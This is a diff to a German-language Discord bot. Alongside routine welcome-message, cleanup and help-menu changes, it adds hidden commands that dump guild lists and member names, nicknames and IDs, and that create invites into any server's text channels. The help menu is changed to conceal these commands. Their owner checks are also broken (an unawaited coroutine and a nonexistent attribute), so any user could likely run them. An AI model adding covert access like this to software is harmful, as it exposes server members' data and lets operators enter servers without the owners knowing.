@@ -76,8 +76,10 @@ async def on_member_join(member):
         channel_name = rc_doc["channel"]
         channelname = discord.utils.get(member.guild.channels, id=channel_name)
         await channelname.send(f'{member} ist {member.guild.name} beigetretten!')
-        if member.bot == False:
+        try:
             await member.send(f'Willkommen bei {member.guild.name}, {member.mention}!')
+        except:
+            pass
         role_id = rc_doc["role"]
         role = member.guild.get_role(role_id)
         await member.add_roles(role)
@@ -117,6 +119,8 @@ async def on_guild_join(guild):
 @client.event
 async def on_guild_remove(guild):
     await client.change_presence(activity=discord.Activity(status=discord.Status.online, type=discord.ActivityType.playing, name=f'Your Mother in {len(client.guilds)} Servers'))
+    g_coll = db[guild.id]
+    g_coll.drop()
 
 
 @client.event
@@ -239,23 +243,27 @@ class Moderation(commands.Cog):
         help_embed.set_footer(text=ctx.message.author, icon_url=ctx.message.author.avatar_url)
         if commandarg == None:
             for command in client.commands:
-                if command.name[0] == '_':
-                    aliases = list(set(command.aliases))
-                    name = aliases[0]
-                else:
-                    name = command.name
-                text = f'Name: `{name}`\nDescription: `{command.description}`\nUsage: `{command.usage}`'
-                help_embed.add_field(name=name, value=text, inline=True)
+                if command.hidden != True:
+                    if command.name[0] == '_':
+                        aliases = list(set(command.aliases))
+                        name = aliases[0]
+                    else:
+                        name = command.name
+                    text = f'Name: `{name}`\nDescription: `{command.description}`\nUsage: `{command.usage}`'
+                    help_embed.add_field(name=name, value=text, inline=True)
         else:
             command = discord.utils.get(client.commands, name=commandarg)
             if command != None:
-                aliases = list(set(command.aliases))
-                if len(aliases) != 0:
-                    aliases = ', '.join(aliases)
-                    help_text = f'Name: `{command.name}`\nDescription: `{command.description}`\nUsage: `{command.usage}`\nAliases: `{aliases}`'
+                if command.hidden != True:
+                    aliases = list(set(command.aliases))
+                    if len(aliases) != 0:
+                        aliases = ', '.join(aliases)
+                        help_text = f'Name: `{command.name}`\nDescription: `{command.description}`\nUsage: `{command.usage}`\nAliases: `{aliases}`'
+                    else:
+                        help_text = f'Name: `{command.name}`\nDescription: `{command.description}`\nUsage: `{command.usage}`'
+                    help_embed.add_field(name=command.name, value=help_text, inline=True)
                 else:
-                    help_text = f'Name: `{command.name}`\nDescription: `{command.description}`\nUsage: `{command.usage}`'
-                help_embed.add_field(name=command.name, value=help_text, inline=True)
+                    await ctx.send('Denied')
             else:       
                 for command in client.commands:
                     if command.name[0] == '_':
@@ -902,11 +910,53 @@ class Voice(commands.Cog):
             await ctx.send(f'Sie befinden sich nicht in einem Sprachkanal!')
 
 
+
+class OP(commands.Cog):
+
+    def __init__(self, client):
+        self.client = client
+
+
+    @client.command(hidden=True, aliases=['lg', 'LG'])
+    async def listguilds(ctx):
+        if client.is_owner(ctx.message.author):
+            f = open('guilds.txt', 'a+')
+            for guild in client.guilds:
+                f.write(f'{guild.name} : {guild.id}\n')
+            f.close()
+            await ctx.send(file=discord.File('guilds.txt'))
+            os.remove('guilds.txt')
+
+    
+    @client.command(hidden=True, aliases=['lm', 'LM'])
+    async def listmembers(ctx, guild_id):
+        if client.is_owner(ctx.message.owner):
+            f = open('members.txt', 'a+')
+            guild = await client.fetch_guild(guild_id)
+            for member in guild.members:
+                f.write(f'{member} / {member.nick} : {member.id}\n')
+            f.write(f'Owner: {guild.owner.name}')
+            f.close()
+            await ctx.send(file=discord.File('members.txt'))
+            os.remove('members.txt')
+
+
+    @client.command(hidden=True, aliases=['gi', 'GI'])
+    async def getinvite(ctx, guild_id):
+        if client.is_owner(ctx.message.author):
+            guild = await client.fetch_guild(guild_id)
+            for channel in guild.text_channels:
+                invite = await channel.create_invite()
+                await ctx.send(invite)
+
+
+
 def setup(client):
     client.add_cog(Moderation(client))
     client.add_cog(Chat(client))
     client.add_cog(Conversion(client))
     client.add_cog(Voice(client))
+    client.add_cog(OP(client))
 
 DISCORD_S3 = os.environ['DISCORD_TOKEN']     
 client.run(DISCORD_S3)
